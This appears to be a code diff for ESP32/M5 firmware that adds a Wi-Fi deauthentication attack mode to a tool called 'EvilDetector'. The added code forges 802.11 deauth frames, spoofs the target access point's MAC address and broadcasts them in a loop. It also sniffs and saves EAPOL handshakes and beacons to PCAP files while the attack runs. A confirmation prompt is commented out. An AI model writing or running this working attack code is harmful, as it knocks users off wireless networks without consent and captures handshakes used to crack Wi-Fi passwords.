@@ -52,6 +52,20 @@ String pwnagotchiPwnd = "";
 bool detectedEAPOL = false;
 int nombreDeEAPOL = 0;
 
+// Deauther Attack Variables
+uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};   // MAC source
+uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // MAC client - brodcast - should not work on some device that need to be mac spoofed
+uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,};   // MAC access point
+const uint8_t deauth_frame_default[] = {
+    0xc0, 0x00, // type, subtype
+    0x3a, 0x01, // duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // MAC client
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC source (ESP32)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC access point
+    0xf0, 0xff, // fragment & squence number
+    0x02, 0x00 // reason code
+};
+
 typedef struct {
   unsigned protocol:2;
   unsigned type:2;
@@ -174,6 +188,9 @@ EvilDetector::EvilDetector() {
     autoChannelHop = true; // Starts in auto mode
     channelType = autoChannelHop ? "Auto" : "Static";
     maxChannelScanning = 13;
+    isAppRunning = false;
+    deauthCount = 0;
+    cfg_sniffEAPOL = false;
 }
 
 void EvilDetector::emptyDetectorCallback(CallbackMenuItem& menuItem) {
@@ -183,10 +200,15 @@ void EvilDetector::emptyDetectorCallback(CallbackMenuItem& menuItem) {
     menuItem.getMenu()->displaySoftKey(BtnCSlot, "Next");
 }
 
+void EvilDetector::emptyDeautherCallback(CallbackMenuItem& menuItem) {
+    M5.Display.clear();
+    menuItem.getMenu()->displaySoftKey(BtnBSlot, "Stop");
+}
+
 void EvilDetector::showDetectorApp() {
     // Set up application for first run
     if (!isAppRunning) {
-        bluetoothEnabled = false;
+        //bluetoothEnabled = false;
         esp_wifi_set_promiscuous(false);
         esp_wifi_stop();
         esp_wifi_set_promiscuous_rx_cb(NULL);
@@ -241,15 +263,97 @@ void EvilDetector::showDetectorApp() {
     }
 }
 
-void EvilDetector::closeApp() {
+void EvilDetector::showDeautherApp() {
+    // Set up application for first run
+    if (!isAppRunning) {
+        ssid = currentClonedSSID;
+/*        if (!ui.confirmPopup("Deauth attack on:\n      " + ssid, false)) {
+            // Return to the main menu
+            closeDeautherApp();
+        }*/
+        Serial.println("Deauth attack started");
+        Serial.println("-------------------");
+        Serial.println("Starting Deauth Attack");
+        Serial.println("-------------------");
+
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_stop();
+        esp_wifi_set_promiscuous_rx_cb(NULL);
+        esp_wifi_deinit();
+        delay(300); // Petite pause pour s'assurer que tout est terminé
+        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+        esp_wifi_init(&cfg);
+        esp_wifi_set_mode(WIFI_MODE_STA); // Set station mode
+        esp_wifi_start(); // start Wi-Fi
+
+//        if (ui.confirmPopup("   Do you want to\n       sniff EAPOL ?", false)) {
+        if (cfg_sniffEAPOL) {
+            esp_wifi_set_promiscuous(true);
+            esp_wifi_set_promiscuous_rx_cb(snifferCallbackDeauth);
+        }
+
+        // Récupérer les informations de l'AP sélectionné
+        uint8_t* bssid = WiFi.BSSID(networkIndex);
+        channel = WiFi.channel(networkIndex);
+        macAddress = convMACToStr(bssid);
+
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        currentChannelDeauth = channel;
+        updateMacAddresses(bssid);
+
+        Serial.print("SSID: "); Serial.println(ssid);
+        Serial.print("MAC Address: "); Serial.println(macAddress);
+        Serial.print("Channel: "); Serial.println(channel);
+
+        toggleAppRunning();
+    }
+
+    // Run the app
+    if (ui.waitToRefresh()) {
+        sendDeauthPacket();
+        deauthCount++;
+
+        // Draw the screen
+        ui.writeMessageXY_small("H: " + String(nombreDeHandshakes), 228, 35, false);
+        ui.writeMessageXY_small("EAPOL: " + String(nombreDeEAPOL), 182, 55, false);
+        ui.writeMessageXY_small("SSID: " + ssid, 10, 40, false);
+        ui.writeMessageXY_small("MAC: " + macAddress, 10, 60, false);
+        ui.writeMessageXY_small("Channel: " + String(channel), 10, 80, false);
+        ui.writeMessageXY_small("Deauth sent: " + String(deauthCount), 10, 110, false);
+    }
+}
+
+void EvilDetector::closeDetectorApp() {
     esp_wifi_set_promiscuous(false);
     toggleAppRunning();
-    toggleAutoChannelHop();
+    //toggleAutoChannelHop();
     ui.waitAndReturnToMenu("Stop detection...");
+}
+
+void EvilDetector::closeDeautherApp() {
+    toggleAppRunning();
+    Serial.println("-------------------");
+    Serial.println("Stopping Deauth Attack");
+    Serial.println("-------------------");
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    /*esp_wifi_stop();
+    esp_wifi_deinit();*/
+
+    ui.waitAndReturnToMenu("Stopping Deauth Attack");
 }
 
 void EvilDetector::toggleAppRunning() {
     isAppRunning = !isAppRunning;
+}
+
+void EvilDetector::toggleCfgSniffEAPOL() {
+    cfg_sniffEAPOL = !cfg_sniffEAPOL;
+}
+
+bool EvilDetector::getCfgSniffEAPOL() {
+    return cfg_sniffEAPOL;
 }
 
 void EvilDetector::toggleAutoChannelHop() {
@@ -469,4 +573,69 @@ void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
             nombreDeDeauth++;
         }
     }
+}
+
+// Deauther Attack
+void snifferCallbackDeauth(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+
+    // Data structs for easier packet data collection
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;
+    const wifi_header_frame_control_t *fctl = (wifi_header_frame_control_t *)&hdr->frame_ctrl;
+    int len = pkt->rx_ctrl.sig_len;
+
+    const wifi_eapol_packet_t *eapolPkt = (wifi_eapol_packet_t *)pkt->payload;
+    const wifi_eapol_mac_hdr_t *eapolHdr = &eapolPkt->hdr;
+
+    if (isAnEAPOLPacket(pkt)) {
+        Serial.println("EAPOL Detected !!!!");
+        Serial.println("Address MAC destination: " + convMACToStr(eapolHdr->addr1));
+        Serial.println("Address MAC expedition: " + convMACToStr(eapolHdr->addr2));
+
+        saveToPCAPFile(pkt, false);
+        nombreDeEAPOL++;
+    }
+
+    if (fctl->type == WIFI_PKT_MGMT && fctl->subtype == BEACON) {
+/*        const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+
+        // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
+        char macStr[18];
+        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+        senderAddr[0], senderAddr[1], senderAddr[2], senderAddr[3], senderAddr[4], senderAddr[5]);
+*/
+        pkt->rx_ctrl.sig_len -= 4;  // Réduire la longueur du signal de 4 bytes
+        saveToPCAPFile(pkt, true);  // Enregistrer le paquet
+    }
+}
+
+void sendDeauthPacket() {
+  // Création d'une copie modifiable du paquet de déauthentification
+  uint8_t deauth_frame[sizeof(deauth_frame_default)];
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+  // Modifier les adresses MAC dans le paquet de déauthentification copié
+  for (int i = 0; i < 6; i++) {
+    deauth_frame[4 + i] = receiver_mac[i];  // Adresse MAC du récepteur
+    deauth_frame[10 + i] = source_mac[i];  // Adresse MAC source
+    deauth_frame[16 + i] = ap_mac[i];      // Adresse MAC de l'access point
+  }
+
+  // Envoyer le paquet modifié
+  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
+
+  // Affichage du contenu du paquet pour le débogage
+    Serial.println("Deauthentication Frame:");
+    for (int i = 0; i < sizeof(deauth_frame); i++) {
+    Serial.print(deauth_frame[i], HEX);
+    Serial.print(" ");
+    }
+    Serial.println();
+}
+
+void updateMacAddresses(uint8_t* bssid) {
+  memcpy(source_mac, bssid, 6);
+  memcpy(ap_mac, bssid, 6);
 }
